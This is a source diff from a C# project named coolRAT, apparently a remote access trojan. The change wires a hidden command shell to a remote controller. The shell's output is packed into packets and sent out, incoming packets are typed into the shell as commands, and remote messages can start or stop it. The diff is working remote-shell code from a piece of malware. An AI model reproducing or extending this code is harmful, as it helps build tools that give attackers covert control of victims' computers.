@@ -1,4 +1,6 @@
-﻿using System;
+﻿using coolRAT.Libs.Connections;
+using coolRAT.Libs.Packets;
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Text;
@@ -7,25 +9,6 @@ using System.Threading.Tasks;
 
 namespace coolRAT.Libs
 {
-    public class ShellInputChangedEventArgs : EventArgs
-    {
-        public string Change;
-
-        public ShellInputChangedEventArgs(string change)
-        {
-            Change = change;
-        }
-    }
-
-    public class ShellOutputChangedEventArgs : EventArgs
-    {
-        public string Change;
-
-        public ShellOutputChangedEventArgs(string change)
-        {
-            Change = change;
-        }
-    }
 
     public class Shell
     {
@@ -37,12 +20,6 @@ namespace coolRAT.Libs
         public StringBuilder GlobalInputBuffer;
 
         private DataReceivedEventHandler DataReceivedEventHandler;
-
-        public delegate void ShellInputChangedHandler(object sender, ShellInputChangedEventArgs e);
-        public event ShellInputChangedHandler ShellInputChanged;
-
-        public delegate void ShellOutputChangedHandler(object sender, ShellOutputChangedEventArgs e);
-        public event ShellOutputChangedHandler ShellOutputChanged;
 
         public static bool ResetClock;
         public static int Buffer_Timeout = 100;
@@ -70,11 +47,8 @@ namespace coolRAT.Libs
                 {
                     if (GlobalOutputBuffer.Length == 0) continue;
                     // Send buffer contents to the remote shell
-                    if (ShellOutputChanged != null)
-                    {
-                        ShellOutputChangedEventArgs args = new ShellOutputChangedEventArgs(GlobalOutputBuffer.ToString());
-                        ShellOutputChanged(this, args);
-                    }
+                    Shell_IO_ChangedPacket changedPacket = new Shell_IO_ChangedPacket(OwnerClient.UniqueId, ChangeType.Output, GlobalOutputBuffer.ToString());
+                    OwnerClient.SendPacket(changedPacket);
                     GlobalOutputBuffer.Clear();
                 }
                 else
@@ -96,6 +70,48 @@ namespace coolRAT.Libs
             DataReceivedEventHandler = new DataReceivedEventHandler(CmdOutputDataHandler);
             Process.OutputDataReceived += DataReceivedEventHandler;
             Process.ErrorDataReceived += DataReceivedEventHandler;
+
+            // Register event handlers
+            OwnerClient.RegisterPacketHandler("Shell_IO_ChangedPacket", Shell_PacketReceivedHandler);
+            OwnerClient.RegisterPacketHandler("SetShellStatePacket", Shell_PacketReceivedHandler);
+        }
+
+        public void Shell_PacketReceivedHandler(object sender, PacketReceivedEventArgs e)
+        {
+            if(e.Packet.Type == "Shell_IO_ChangedPacket")
+            {
+                Shell_IO_ChangedPacket changedPacket = Shell_IO_ChangedPacket.Deserialize(e.RawPacket);
+                if (changedPacket.ChangeType == ChangeType.Input)
+                    Write(changedPacket.Change);
+                return;
+            }
+
+            if(e.Packet.Type == "SetShellStatePacket")
+            {
+                SetShellStatePacket setShellState = SetShellStatePacket.Deserialize(e.RawPacket);
+                if(setShellState.ShellUniqueId != UniqueId)
+                {
+                    ShellStateSetPacket result_fail = new ShellStateSetPacket(setShellState.UniqueClientId, setShellState.ShellUniqueId,
+                    setShellState.ShellState, false);
+                    OwnerClient.SendPacket(result_fail);
+                    return;
+                }
+
+                switch(setShellState.ShellState)
+                {
+                    case ShellState.Running:
+                        Start();
+                        break;
+                    case ShellState.Stopped:
+                        Stop();
+                        break;
+                }
+
+                ShellStateSetPacket result_success = new ShellStateSetPacket(setShellState.UniqueClientId, setShellState.ShellUniqueId,
+                    setShellState.ShellState, true);
+                OwnerClient.SendPacket(result_success);
+                return;
+            }
         }
 
         public void Start()
@@ -104,13 +120,17 @@ namespace coolRAT.Libs
             Task.Run(() => Clock_Tick());
             Process.BeginOutputReadLine();
             Process.BeginErrorReadLine();
+            Process.StandardInput.Write("\n");
         }
 
         public void Stop()
         {
+            if (Process == null) return;
             Process.Kill();
             Process.OutputDataReceived -= DataReceivedEventHandler;
             Process.ErrorDataReceived -= DataReceivedEventHandler;
+            OwnerClient.DeregisterPacketHandler("Shell_IO_ChangedPacket");
+            OwnerClient.DeregisterPacketHandler("SetShellStatePacket");
         }
 
         public void Write(string str)
@@ -137,6 +157,7 @@ namespace coolRAT.Libs
                         GlobalOutputBuffer.Append(chr);
                         Process.StandardInput.Write(GlobalInputBuffer.ToString());
                         GlobalInputBuffer.Clear();
+                        Process.StandardInput.Write("\n");
                         break;
                     case '\b':
                         if (GlobalInputBuffer.Length == 0) continue;
